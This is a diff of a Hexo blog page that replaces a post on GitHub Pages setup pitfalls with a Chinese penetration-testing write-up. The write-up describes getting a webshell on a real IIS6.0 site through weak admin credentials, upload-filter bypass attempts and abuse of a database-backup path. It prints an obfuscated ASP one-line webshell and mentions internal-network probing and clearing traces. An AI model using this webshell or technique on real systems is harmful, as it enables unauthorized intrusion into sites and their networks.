@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="搭建博客,hexo,github," />
+  <meta name="keywords" content="渗透测试,文件上传," />
 
 
 
@@ -87,24 +87,29 @@
 
 
 
-<meta name="description" content="细数用github-pages和hexo搭建博客遇到的那些坑上次搭建博客时，踩了很多坑，为了接下来搭建个人博客的朋友们在遇到同样的问题时能够少走弯路，我就在这里谈谈之前踩到的一些比较重要的坑和对应的解决办法   搭建博客的具体过程我就不在赘述，有需要的朋友可以参考达壕的教程详细教程—用github-pages与hexo搭建属于自己的免费博客 首先配置git环境和node.js的环境都没有出现问题，">
-<meta name="keywords" content="搭建博客,hexo,github">
+<meta name="description" content="0x00 前言很久之前通过数据库备份拿到的一个webshell，本来准备等他们修复了之后再写的，但是提交了漏洞和修复方案他们接收之后很长时间没有修复，忽视了漏洞。所以今天写出来了。 0x01 多次尝试首先这个站是偶然google hacking时找到的后台弱密码，进入后台之后发现是IIS6.0的服务器：  这个后台可以对前端的文章、新闻等进行修改，发现可以上传图片到文章中，是一个上传点。  先编辑">
+<meta name="keywords" content="渗透测试,文件上传">
 <meta property="og:type" content="article">
-<meta property="og:title" content="细数用github-pages和hexo搭建博客遇到的那些坑">
-<meta property="og:url" content="http://yoursite.com/2017/04/08/细数用github-pages和hexo搭建博客遇到的那些坑/index.html">
+<meta property="og:title" content="数据库备份getshell">
+<meta property="og:url" content="http://yoursite.com/2018/05/19/数据库备份getshell/index.html">
 <meta property="og:site_name" content="Leticia&#39;s Blog">
-<meta property="og:description" content="细数用github-pages和hexo搭建博客遇到的那些坑上次搭建博客时，踩了很多坑，为了接下来搭建个人博客的朋友们在遇到同样的问题时能够少走弯路，我就在这里谈谈之前踩到的一些比较重要的坑和对应的解决办法   搭建博客的具体过程我就不在赘述，有需要的朋友可以参考达壕的教程详细教程—用github-pages与hexo搭建属于自己的免费博客 首先配置git环境和node.js的环境都没有出现问题，">
+<meta property="og:description" content="0x00 前言很久之前通过数据库备份拿到的一个webshell，本来准备等他们修复了之后再写的，但是提交了漏洞和修复方案他们接收之后很长时间没有修复，忽视了漏洞。所以今天写出来了。 0x01 多次尝试首先这个站是偶然google hacking时找到的后台弱密码，进入后台之后发现是IIS6.0的服务器：  这个后台可以对前端的文章、新闻等进行修改，发现可以上传图片到文章中，是一个上传点。  先编辑">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/1.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/2.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/3.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/0004.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/5.png">
-<meta property="og:updated_time" content="2017-12-27T09:21:52.036Z">
+<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback01.png">
+<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback02.png">
+<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback03.png">
+<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback04.png">
+<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback05.png">
+<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback06.png">
+<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback07.png">
+<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback08.png">
+<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback09.png">
+<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback10.png">
+<meta property="og:updated_time" content="2018-05-30T03:18:14.695Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="细数用github-pages和hexo搭建博客遇到的那些坑">
-<meta name="twitter:description" content="细数用github-pages和hexo搭建博客遇到的那些坑上次搭建博客时，踩了很多坑，为了接下来搭建个人博客的朋友们在遇到同样的问题时能够少走弯路，我就在这里谈谈之前踩到的一些比较重要的坑和对应的解决办法   搭建博客的具体过程我就不在赘述，有需要的朋友可以参考达壕的教程详细教程—用github-pages与hexo搭建属于自己的免费博客 首先配置git环境和node.js的环境都没有出现问题，">
-<meta name="twitter:image" content="http://oo3iot5oz.bkt.clouddn.com/1.png">
+<meta name="twitter:title" content="数据库备份getshell">
+<meta name="twitter:description" content="0x00 前言很久之前通过数据库备份拿到的一个webshell，本来准备等他们修复了之后再写的，但是提交了漏洞和修复方案他们接收之后很长时间没有修复，忽视了漏洞。所以今天写出来了。 0x01 多次尝试首先这个站是偶然google hacking时找到的后台弱密码，进入后台之后发现是IIS6.0的服务器：  这个后台可以对前端的文章、新闻等进行修改，发现可以上传图片到文章中，是一个上传点。  先编辑">
+<meta name="twitter:image" content="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback01.png">
 
 
 
@@ -132,13 +137,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/04/08/细数用github-pages和hexo搭建博客遇到的那些坑/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/05/19/数据库备份getshell/"/>
 
 
 
 
 
-  <title> 细数用github-pages和hexo搭建博客遇到的那些坑 | Leticia's Blog </title>
+  <title> 数据库备份getshell | Leticia's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -267,7 +272,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/08/细数用github-pages和hexo搭建博客遇到的那些坑/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/19/数据库备份getshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="麻薯">
@@ -288,7 +293,7 @@
             
             
               
-                细数用github-pages和hexo搭建博客遇到的那些坑
+                数据库备份getshell
               
             
           </h1>
@@ -303,8 +308,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-08T22:28:57+08:00">
-                2017-04-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-19T11:16:25+08:00">
+                2018-05-19
               </time>
             
 
@@ -326,8 +331,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/搭建博客/" itemprop="url" rel="index">
-                    <span itemprop="name">搭建博客</span>
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
                   </a>
                 </span>
 
@@ -343,7 +348,7 @@
 
           
           
-             <span id="/2017/04/08/细数用github-pages和hexo搭建博客遇到的那些坑/" class="leancloud_visitors" data-flag-title="细数用github-pages和hexo搭建博客遇到的那些坑">
+             <span id="/2018/05/19/数据库备份getshell/" class="leancloud_visitors" data-flag-title="数据库备份getshell">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -390,22 +395,32 @@
       
 
       
-        <h1 id="细数用github-pages和hexo搭建博客遇到的那些坑"><a href="#细数用github-pages和hexo搭建博客遇到的那些坑" class="headerlink" title="细数用github-pages和hexo搭建博客遇到的那些坑"></a>细数用github-pages和hexo搭建博客遇到的那些坑</h1><p>上次搭建博客时，踩了很多坑，为了接下来搭建个人博客的朋友们在遇到同样的问题时能够少走弯路，我就在这里谈谈之前踩到的一些比较重要的坑和对应的解决办法  </p>
-<p>搭建博客的具体过程我就不在赘述，有需要的朋友可以参考达壕的教程<a href="http://www.saberismywife.com/2016/06/27/%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B%E2%80%94%E7%94%A8github-pages%E4%B8%8Ehexo%E6%90%AD%E5%BB%BA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%85%8D%E8%B4%B9%E5%8D%9A%E5%AE%A2/" target="_blank" rel="noopener">详细教程—用github-pages与hexo搭建属于自己的免费博客</a></p>
-<p>首先配置git环境和node.js的环境都没有出现问题，从官网上下载安装包安装完成就可以了，我遇到的第一个问题是hexo的安装：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
-<p>当在git-bush中输入以上代码时，长时间不进入下一步只能用ctrl+c退出。这里我一开始认为是node.js和git的版本出错，找了很多解决方法都不奏效，最后发现其实是npm官方镜像连不通，在这里只需要把源换成taobao的就可以，代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry &quot;https://registry.npm.taobao.org&quot;</span><br></pre></td></tr></table></figure>
-<p>之后重新输入安装hexo的代码就可以<br><img src="http://oo3iot5oz.bkt.clouddn.com/1.png" alt=""></p>
-<p>第二个问题是在部署hexo的时候，出现如下错误：</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/2.png" alt=""></p>
-<p>这个错误是因为hexo3.0后需要在_config.yml中设置 deploy中的type为git，这里需要在本地仓库输入以下代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
-<p>最后一个问题是在域名解析的时候，ping自己的github页面，返回地址可以当作A类解析指向的ipv4地址，但是这个地址有时会改变，会使域名解析失效：<br><img src="http://oo3iot5oz.bkt.clouddn.com/3.png" alt=""></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/0004.png" alt=""><br>所以这里使用CNAME的解析方式更好，在你的github仓库创建一个CNAME文件，里面写着你的域名，然后再在你的域名提供商那里设置解析如下就可以解决问题</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/5.png" alt=""></p>
-<p>第一次尝试的朋友应该还会犯很多错误，比如ssh-key的创建和使用过程的问题，还有因为readme.md文件没有同步到本地引发的一些git上传时候的错误，这些问题的解决方案百度有很多，都很容易解决。</p>
-<p>冰心曾说:“成功的花,人们只惊慕她现时的明艳,然而当初它的芽儿,浸透了奋斗的泪泉,洒遍了牺牲的血雨”。尝试的道路上充满着荆棘，错误在所难免，希望这篇博客能帮到同样在尝试的你们。</p>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很久之前通过数据库备份拿到的一个webshell，本来准备等他们修复了之后再写的，但是提交了漏洞和修复方案他们接收之后很长时间没有修复，忽视了漏洞。所以今天写出来了。</p>
+<h2 id="0x01-多次尝试"><a href="#0x01-多次尝试" class="headerlink" title="0x01 多次尝试"></a>0x01 多次尝试</h2><p>首先这个站是偶然google hacking时找到的后台弱密码，进入后台之后发现是IIS6.0的服务器：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback01.png" alt=""></p>
+<p>这个后台可以对前端的文章、新闻等进行修改，发现可以上传图片到文章中，是一个上传点。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback02.png" alt=""></p>
+<p>先编辑一个一句话木马,存为asp格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;4&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;</span><br></pre></td></tr></table></figure></p>
+<p>直接上传.asp文件，被防火墙阻止。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback03.png" alt=""></p>
+<p>先上传.jpg文件，然后通过burpsuite更改后缀为.asp，然后上传，发现仍然被拦截，看来是后端拦截。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback04.png" alt=""></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback05.png" alt=""></p>
+<p>尝试使用IIS6.0的解析漏洞，将.asp;.jpg文件解析成.asp文件，但是更改了一个1.asp;.jpg后缀的文件上传之后，文件名整体被改成一个日期的+随机数+.jpg的文件名。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback06.png" alt=""></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback07.png" alt=""></p>
+<p>尝试用burpsuite改数据，0x00截断方式、超长文件名仍然不可行。</p>
+<h2 id="0x02-改变思路"><a href="#0x02-改变思路" class="headerlink" title="0x02 改变思路"></a>0x02 改变思路</h2><p>本来测试到这里我已经放弃通过上传点来getshell，但是不甘心就去问了下朋友，朋友说他正好在复现这个kindeditor编辑器的漏洞，为我提供了其他思路，我去网上找了一会kindeditor编辑器漏洞版本，尝试了一会，发现目前这个版本是4.1.10不存在之前那些典型的漏洞。</p>
+<p>然后这个时候朋友告诉我有数据库备份，可以通过数据库备份功能来利用解析漏洞。</p>
+<h2 id="0x03-开始尝试"><a href="#0x03-开始尝试" class="headerlink" title="0x03 开始尝试"></a>0x03 开始尝试</h2><p>先编辑一个过狗asp马，更改为jpg格式上传。</p>
+<p>然后在数据库备份界面，发现直接无法更改备份的源路径和目的路径</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback08.png" alt=""></p>
+<p>但是这两个路径是前端可控的，那就很容易了，直接f12更改页面中对应的原路径为自己上传的图片马，目的路径为123.asp即可。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback09.png" alt=""></p>
+<p>然后备份数据库，在upload路径找到自己的马，直接用菜刀连接，成功getshell。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback10.png" alt=""></p>
+<p>后来传大马稍微对内网测试了一下，然后完成之后清理痕迹。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>虽然是很老的一个漏洞了，没有太多亮点，但是体现了渗透测试过程中要力求多样性，了解的方式和技巧越多，就距离成功越接近。</p>
 
       
     </div>
@@ -435,11 +450,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/搭建博客/" rel="tag"># 搭建博客</a>
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
           
-            <a href="/tags/hexo/" rel="tag"># hexo</a>
-          
-            <a href="/tags/github/" rel="tag"># github</a>
+            <a href="/tags/文件上传/" rel="tag"># 文件上传</a>
           
         </div>
       
@@ -452,8 +465,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/04/03/hello-world/" rel="next" title="博客搭建完成了">
-                <i class="fa fa-chevron-left"></i> 博客搭建完成了
+              <a href="/2018/05/17/渗透测试框架metasploit/" rel="next" title="渗透测试框架metasploit">
+                <i class="fa fa-chevron-left"></i> 渗透测试框架metasploit
               </a>
             
           </div>
@@ -462,8 +475,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/04/26/用字符数组实现2的n次方（大数问题）/" rel="prev" title="用字符数组实现2的n次方（大数问题）">
-                用字符数组实现2的n次方（大数问题） <i class="fa fa-chevron-right"></i>
+              <a href="/2018/05/21/分析并复现一次iframe框架钓鱼行为/" rel="prev" title="分析并复现一次iframe框架钓鱼行为">
+                分析并复现一次iframe框架钓鱼行为 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -593,7 +606,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#细数用github-pages和hexo搭建博客遇到的那些坑"><span class="nav-number">1.</span> <span class="nav-text">细数用github-pages和hexo搭建博客遇到的那些坑</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-多次尝试"><span class="nav-number">2.</span> <span class="nav-text">0x01 多次尝试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-改变思路"><span class="nav-number">3.</span> <span class="nav-text">0x02 改变思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-开始尝试"><span class="nav-number">4.</span> <span class="nav-text">0x03 开始尝试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-number">5.</span> <span class="nav-text">0x04 总结</span></a></li></ol></div>
             
 
           </div>
